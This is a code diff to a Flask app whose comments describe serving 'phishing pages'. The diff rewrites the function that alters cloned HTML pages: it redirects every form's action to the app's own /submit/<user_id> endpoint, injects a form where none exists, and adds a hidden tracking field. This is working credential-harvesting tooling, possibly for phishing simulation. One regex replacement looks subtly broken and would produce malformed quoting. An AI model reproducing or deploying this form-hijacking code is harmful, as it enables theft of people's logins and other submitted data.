@@ -90,6 +90,8 @@ def serve_phish_page(user_id):
     return "Page not found", 404
 
 
+
+
 # Route to handle form submissions from phishing pages
 # Updated to handle both GET and POST methods
 @app.route('/submit/<user_id>', methods=['GET', 'POST'])
@@ -292,66 +294,48 @@ def modify_html_form(html_path, user_id, template_name):
         with open(html_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
 
-        # Check if a form exists in the content
-        if '<form' not in content.lower():
-            # If no form exists, inject a basic form around the body content
-            logger.info(f"No form found in {html_path}, injecting a form...")
-            body_start = content.lower().find('<body')
-            body_end = content.lower().find('</body')
+        # First look for form tags with method and action
+        form_tag_pattern = re.compile(r'<form[^>]*>', re.IGNORECASE)
+        form_tags = form_tag_pattern.findall(content)
 
-            if body_start != -1 and body_end != -1:
-                # Find the end of the body opening tag
-                body_tag_end = content.find('>', body_start)
-                if body_tag_end != -1:
-                    form_opening = f'<form method="post" action="/submit/{user_id}">'
-                    form_closing = f'<input type="hidden" name="template" value="{template_name}"></form>'
+        if form_tags:
+            logger.info(f"Found {len(form_tags)} form tags in {html_path}")
+            for form_tag in form_tags:
+                # Create new form tag with our submission URL
+                new_form = form_tag
 
-                    content = (content[:body_tag_end + 1] +
-                               form_opening +
-                               content[body_tag_end + 1:body_end] +
-                               form_closing +
-                               content[body_end:])
-            else:
-                logger.warning(f"Could not find body tags in {html_path}")
-                return False
+                # Replace action attribute if it exists
+                action_pattern = re.compile(r'action=(["\'])(.*?)\1', re.IGNORECASE)
+                new_form = action_pattern.sub(f'action="\\1/submit/{user_id}\\1', new_form)
+
+                # If no action attribute exists, add it
+                if 'action=' not in new_form.lower():
+                    new_form = new_form.replace('<form', f'<form action="/submit/{user_id}"')
+
+                # Make sure there's a method attribute
+                if 'method=' not in new_form.lower():
+                    new_form = new_form.replace('<form', '<form method="post"')
+
+                # Replace the original form tag with our modified one
+                content = content.replace(form_tag, new_form)
         else:
-            # Extract all form elements to preserve them
-            input_pattern = re.compile(r'<input.*?name=["\'](.*?)["\'].*?>', re.IGNORECASE | re.DOTALL)
-            input_matches = input_pattern.findall(content)
-            logger.info(f"Found form fields: {input_matches}")
-
-            # Check for select elements
-            select_pattern = re.compile(r'<select.*?name=["\'](.*?)["\'].*?>', re.IGNORECASE | re.DOTALL)
-            select_matches = select_pattern.findall(content)
-            input_matches.extend(select_matches)
-
-            # More aggressive form detection
-            form_pattern = re.compile(r'<form[^>]*>', re.IGNORECASE)
-            form_matches = form_pattern.findall(content)
-
-            if form_matches:
-                for form_tag in form_matches:
-                    # Replace with our form tag maintaining any class or other attributes
-                    new_form = re.sub(r'action=(["\']).*?\1', f'action="/submit/{user_id}"', form_tag,
-                                      flags=re.IGNORECASE)
-                    if 'action=' not in new_form.lower():
-                        new_form = new_form.replace('<form', f'<form action="/submit/{user_id}"')
-
-                    if 'method=' not in new_form.lower():
-                        new_form = new_form.replace('<form', '<form method="post"')
-
-                    content = content.replace(form_tag, new_form)
+            logger.warning(f"No form tags found in {html_path}, trying to inject one...")
+            # Try to find the body tag to inject a form
+            body_end = content.lower().find('</body')
+            if body_end != -1:
+                # Inject a basic form element
+                form_html = f'<form method="post" action="/submit/{user_id}"></form>'
+                content = content[:body_end] + form_html + content[body_end:]
             else:
-                logger.warning(f"No form found in {html_path} after regex search")
+                logger.error(f"Could not find </body> tag in {html_path}")
                 return False
 
-            # Add a hidden field to track which template was used
-            form_end_pattern = re.compile(r'</form>', re.IGNORECASE)
-            if form_end_pattern.search(content):
-                content = form_end_pattern.sub(f'<input type="hidden" name="template" value="{template_name}"></form>',
-                                               content)
+        # Add hidden field for template tracking
+        form_end_pattern = re.compile(r'</form>', re.IGNORECASE)
+        if form_end_pattern.search(content):
+            hidden_field = f'<input type="hidden" name="template" value="{template_name}">'
+            content = form_end_pattern.sub(f'{hidden_field}</form>', content)
 
-        # Debug - print the file content after modifications
         logger.info(f"Modified HTML content: {content[:500]}...")
 
         with open(html_path, 'w', encoding='utf-8') as f:
